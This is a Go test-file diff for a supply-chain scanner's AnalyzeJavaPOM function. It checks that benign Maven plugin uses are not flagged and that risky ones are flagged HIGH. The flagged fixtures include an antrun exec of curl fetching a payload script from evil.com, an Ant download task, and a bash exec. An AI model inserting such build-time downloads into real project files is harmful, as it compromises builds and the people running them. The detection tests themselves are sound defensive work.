@@ -776,6 +776,452 @@ func TestAnalyzeJavaPOM_RealWorldSpringBootPOM(t *testing.T) {
 }
 
 // ============================================================
+// AnalyzeJavaPOM Context-Aware Tests
+// ============================================================
+
+// Test: exec-maven-plugin running Java main class (JMH benchmarks) is not flagged
+// Justification: exec-maven-plugin with <mainClass> runs a Java class in the JVM,
+//                which is a standard build operation (benchmarks, code generators,
+//                integration test launchers). This does not indicate supply chain risk.
+// Source: OSSF Scorecard methodology — standard build tool usage should not
+//         produce false positives.
+// Methodology: Pass pom.xml with exec-maven-plugin using <mainClass> for JMH
+// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
+func TestAnalyzeJavaPOM_ExecPluginWithMainClass(t *testing.T) {
+	pomContent := `
+<project>
+  <build>
+    <plugins>
+      <plugin>
+        <groupId>org.codehaus.mojo</groupId>
+        <artifactId>exec-maven-plugin</artifactId>
+        <executions>
+          <execution>
+            <phase>test</phase>
+            <goals>
+              <goal>java</goal>
+            </goals>
+            <configuration>
+              <mainClass>org.openjdk.jmh.Main</mainClass>
+              <arguments>
+                <argument>.*</argument>
+              </arguments>
+            </configuration>
+          </execution>
+        </executions>
+      </plugin>
+    </plugins>
+  </build>
+</project>
+`
+
+	analysis := AnalyzeJavaPOM(pomContent)
+
+	if analysis.HasDangerousPatterns {
+		patterns := []string{}
+		for _, p := range analysis.DangerousPatterns {
+			patterns = append(patterns, p.Pattern+": "+p.Match)
+		}
+		t.Errorf("False positive on exec-maven-plugin with mainClass. Patterns found: %v", patterns)
+	}
+	if analysis.RiskLevel != "LOW" {
+		t.Errorf("Expected LOW risk level for JMH benchmark execution, got %s", analysis.RiskLevel)
+	}
+}
+
+// Test: exec-maven-plugin running java executable is not flagged
+// Justification: <executable>java</executable> runs the Java runtime, which is
+//                a standard build tool. This pattern is used for integration tests,
+//                code generation, and other build-time Java execution.
+// Source: OSSF Scorecard — standard build tool invocation is not a risk signal.
+// Methodology: Pass pom.xml with exec-maven-plugin using <executable>java</executable>
+// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
+func TestAnalyzeJavaPOM_ExecPluginWithJavaExecutable(t *testing.T) {
+	pomContent := `
+<project>
+  <build>
+    <plugins>
+      <plugin>
+        <groupId>org.codehaus.mojo</groupId>
+        <artifactId>exec-maven-plugin</artifactId>
+        <configuration>
+          <executable>java</executable>
+          <arguments>
+            <argument>-jar</argument>
+            <argument>target/app.jar</argument>
+          </arguments>
+        </configuration>
+      </plugin>
+    </plugins>
+  </build>
+</project>
+`
+
+	analysis := AnalyzeJavaPOM(pomContent)
+
+	if analysis.HasDangerousPatterns {
+		patterns := []string{}
+		for _, p := range analysis.DangerousPatterns {
+			patterns = append(patterns, p.Pattern+": "+p.Match)
+		}
+		t.Errorf("False positive on exec-maven-plugin with java executable. Patterns found: %v", patterns)
+	}
+	if analysis.RiskLevel != "LOW" {
+		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
+	}
+}
+
+// Test: maven-antrun-plugin with only file operations is not flagged
+// Justification: maven-antrun-plugin used for mkdir, copy, and echo is standard
+//                build scaffolding. Spring and other frameworks use antrun for
+//                resource copying and directory setup without any supply chain risk.
+// Source: SLSA framework — file manipulation during build is a normal build
+//         operation, not a supply chain threat.
+// Methodology: Pass pom.xml with antrun using only mkdir/copy/echo tasks
+// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
+func TestAnalyzeJavaPOM_AntRunPluginSafeFileOps(t *testing.T) {
+	pomContent := `
+<project>
+  <build>
+    <plugins>
+      <plugin>
+        <artifactId>maven-antrun-plugin</artifactId>
+        <executions>
+          <execution>
+            <phase>generate-resources</phase>
+            <goals>
+              <goal>run</goal>
+            </goals>
+            <configuration>
+              <target>
+                <mkdir dir="${project.build.directory}/generated"/>
+                <copy todir="${project.build.directory}/resources">
+                  <fileset dir="src/main/resources"/>
+                </copy>
+                <echo message="Resources copied successfully"/>
+              </target>
+            </configuration>
+          </execution>
+        </executions>
+      </plugin>
+    </plugins>
+  </build>
+</project>
+`
+
+	analysis := AnalyzeJavaPOM(pomContent)
+
+	if analysis.HasDangerousPatterns {
+		patterns := []string{}
+		for _, p := range analysis.DangerousPatterns {
+			patterns = append(patterns, p.Pattern+": "+p.Match)
+		}
+		t.Errorf("False positive on antrun with safe file ops. Patterns found: %v", patterns)
+	}
+	if analysis.RiskLevel != "LOW" {
+		t.Errorf("Expected LOW risk level for safe antrun file operations, got %s", analysis.RiskLevel)
+	}
+}
+
+// Test: maven-antrun-plugin with <get> download task is flagged
+// Justification: Ant's <get> task downloads files from URLs during build.
+//                This is a direct supply chain risk vector — an attacker could
+//                modify the POM to download malicious binaries during build.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — downloading
+//         external resources during build is a documented attack vector.
+// Methodology: Pass pom.xml with antrun using <get> to download a file
+// Result: Expects HIGH risk and "maven-antrun-plugin" pattern detected
+func TestAnalyzeJavaPOM_AntRunPluginGetTask(t *testing.T) {
+	pomContent := `
+<project>
+  <build>
+    <plugins>
+      <plugin>
+        <artifactId>maven-antrun-plugin</artifactId>
+        <executions>
+          <execution>
+            <phase>generate-resources</phase>
+            <goals>
+              <goal>run</goal>
+            </goals>
+            <configuration>
+              <target>
+                <get src="https://example.com/binary.jar" dest="${project.build.directory}/lib/binary.jar"/>
+              </target>
+            </configuration>
+          </execution>
+        </executions>
+      </plugin>
+    </plugins>
+  </build>
+</project>
+`
+
+	analysis := AnalyzeJavaPOM(pomContent)
+
+	if !analysis.HasDangerousPatterns {
+		t.Error("Expected dangerous patterns for antrun with <get> download task")
+	}
+
+	found := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "maven-antrun-plugin" {
+			found = true
+			if p.Severity != "HIGH" {
+				t.Errorf("Expected HIGH severity, got %s", p.Severity)
+			}
+		}
+	}
+	if !found {
+		t.Error("Expected maven-antrun-plugin pattern to be detected")
+	}
+}
+
+// Test: maven-antrun-plugin with safe exec (java) is not flagged
+// Justification: Running java via Ant's <exec> task is a standard build operation
+//                (e.g., running annotation processors, code generators). The executable
+//                being java means it's running JVM code, not arbitrary commands.
+// Source: OSSF Scorecard — standard build tool invocation is not a risk signal.
+// Methodology: Pass pom.xml with antrun using <exec executable="java">
+// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
+func TestAnalyzeJavaPOM_AntRunPluginSafeExec(t *testing.T) {
+	pomContent := `
+<project>
+  <build>
+    <plugins>
+      <plugin>
+        <artifactId>maven-antrun-plugin</artifactId>
+        <executions>
+          <execution>
+            <phase>generate-sources</phase>
+            <goals>
+              <goal>run</goal>
+            </goals>
+            <configuration>
+              <target>
+                <exec executable="java">
+                  <arg value="-jar"/>
+                  <arg value="tools/codegen.jar"/>
+                </exec>
+              </target>
+            </configuration>
+          </execution>
+        </executions>
+      </plugin>
+    </plugins>
+  </build>
+</project>
+`
+
+	analysis := AnalyzeJavaPOM(pomContent)
+
+	if analysis.HasDangerousPatterns {
+		patterns := []string{}
+		for _, p := range analysis.DangerousPatterns {
+			patterns = append(patterns, p.Pattern+": "+p.Match)
+		}
+		t.Errorf("False positive on antrun with safe java exec. Patterns found: %v", patterns)
+	}
+	if analysis.RiskLevel != "LOW" {
+		t.Errorf("Expected LOW risk level for safe antrun java exec, got %s", analysis.RiskLevel)
+	}
+}
+
+// Test: maven-antrun-plugin with dangerous exec (curl) is still flagged
+// Justification: Running curl via Ant's <exec> task downloads external resources
+//                during build, which is a direct supply chain compromise vector.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — downloading
+//         external resources during build is a documented attack vector.
+// Methodology: Pass pom.xml with antrun using <exec executable="curl">
+// Result: Expects HIGH risk and "maven-antrun-plugin" pattern detected
+func TestAnalyzeJavaPOM_AntRunPluginDangerousExec(t *testing.T) {
+	pomContent := `
+<project>
+  <build>
+    <plugins>
+      <plugin>
+        <artifactId>maven-antrun-plugin</artifactId>
+        <executions>
+          <execution>
+            <phase>compile</phase>
+            <goals>
+              <goal>run</goal>
+            </goals>
+            <configuration>
+              <target>
+                <exec executable="curl">
+                  <arg value="-o"/>
+                  <arg value="/tmp/payload.sh"/>
+                  <arg value="https://evil.com/payload.sh"/>
+                </exec>
+              </target>
+            </configuration>
+          </execution>
+        </executions>
+      </plugin>
+    </plugins>
+  </build>
+</project>
+`
+
+	analysis := AnalyzeJavaPOM(pomContent)
+
+	if !analysis.HasDangerousPatterns {
+		t.Error("Expected dangerous patterns for antrun with curl exec")
+	}
+
+	found := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "maven-antrun-plugin" {
+			found = true
+			if p.Severity != "HIGH" {
+				t.Errorf("Expected HIGH severity, got %s", p.Severity)
+			}
+		}
+	}
+	if !found {
+		t.Error("Expected maven-antrun-plugin pattern to be detected")
+	}
+}
+
+// Test: exec-maven-plugin declared without configuration is not flagged
+// Justification: A plugin declaration without any execution or configuration
+//                does not execute anything during build. Some POMs declare plugins
+//                in pluginManagement for version pinning without actual usage.
+// Source: OSSF Scorecard — mere presence of a plugin dependency without execution
+//         is not a risk signal.
+// Methodology: Pass pom.xml with bare exec-maven-plugin declaration
+// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
+func TestAnalyzeJavaPOM_ExecPluginDeclarationOnly(t *testing.T) {
+	pomContent := `
+<project>
+  <build>
+    <plugins>
+      <plugin>
+        <groupId>org.codehaus.mojo</groupId>
+        <artifactId>exec-maven-plugin</artifactId>
+        <version>3.1.0</version>
+      </plugin>
+    </plugins>
+  </build>
+</project>
+`
+
+	analysis := AnalyzeJavaPOM(pomContent)
+
+	if analysis.HasDangerousPatterns {
+		patterns := []string{}
+		for _, p := range analysis.DangerousPatterns {
+			patterns = append(patterns, p.Pattern+": "+p.Match)
+		}
+		t.Errorf("False positive on exec-maven-plugin declaration without config. Patterns found: %v", patterns)
+	}
+	if analysis.RiskLevel != "LOW" {
+		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
+	}
+}
+
+// Test: exec-maven-plugin with bash shell is flagged
+// Justification: Running bash via exec-maven-plugin can execute arbitrary shell
+//                scripts during build, which is a direct supply chain compromise
+//                vector — the shell can download, execute, and exfiltrate.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — shell execution
+//         during build is a documented supply chain attack technique.
+// Methodology: Pass pom.xml with exec-maven-plugin running bash
+// Result: Expects HIGH risk and "exec-maven-plugin" pattern detected
+func TestAnalyzeJavaPOM_ExecPluginWithBash(t *testing.T) {
+	pomContent := `
+<project>
+  <build>
+    <plugins>
+      <plugin>
+        <groupId>org.codehaus.mojo</groupId>
+        <artifactId>exec-maven-plugin</artifactId>
+        <configuration>
+          <executable>bash</executable>
+          <arguments>
+            <argument>scripts/build.sh</argument>
+          </arguments>
+        </configuration>
+      </plugin>
+    </plugins>
+  </build>
+</project>
+`
+
+	analysis := AnalyzeJavaPOM(pomContent)
+
+	if !analysis.HasDangerousPatterns {
+		t.Error("Expected dangerous patterns for exec-maven-plugin with bash")
+	}
+
+	found := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "exec-maven-plugin" {
+			found = true
+			if p.Severity != "HIGH" {
+				t.Errorf("Expected HIGH severity, got %s", p.Severity)
+			}
+		}
+	}
+	if !found {
+		t.Error("Expected exec-maven-plugin pattern to be detected")
+	}
+}
+
+// Test: maven-antrun-plugin with <script> task is flagged
+// Justification: Ant's <script> task can execute arbitrary scripting code
+//                (JavaScript, Groovy, etc.) during build, giving full access to
+//                the build environment and filesystem.
+// Source: SLSA framework — arbitrary scripting during build is a build integrity threat.
+// Methodology: Pass pom.xml with antrun using <script> task
+// Result: Expects HIGH risk and "maven-antrun-plugin" pattern detected
+func TestAnalyzeJavaPOM_AntRunPluginScriptTask(t *testing.T) {
+	pomContent := `
+<project>
+  <build>
+    <plugins>
+      <plugin>
+        <artifactId>maven-antrun-plugin</artifactId>
+        <executions>
+          <execution>
+            <phase>compile</phase>
+            <goals>
+              <goal>run</goal>
+            </goals>
+            <configuration>
+              <target>
+                <script language="javascript">
+                  var file = new java.io.File("secret.txt");
+                </script>
+              </target>
+            </configuration>
+          </execution>
+        </executions>
+      </plugin>
+    </plugins>
+  </build>
+</project>
+`
+
+	analysis := AnalyzeJavaPOM(pomContent)
+
+	if !analysis.HasDangerousPatterns {
+		t.Error("Expected dangerous patterns for antrun with <script> task")
+	}
+
+	found := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "maven-antrun-plugin" {
+			found = true
+		}
+	}
+	if !found {
+		t.Error("Expected maven-antrun-plugin pattern to be detected")
+	}
+}
+
+// ============================================================
 // AnalyzeScript Tests (generic script patterns)
 // ============================================================
 
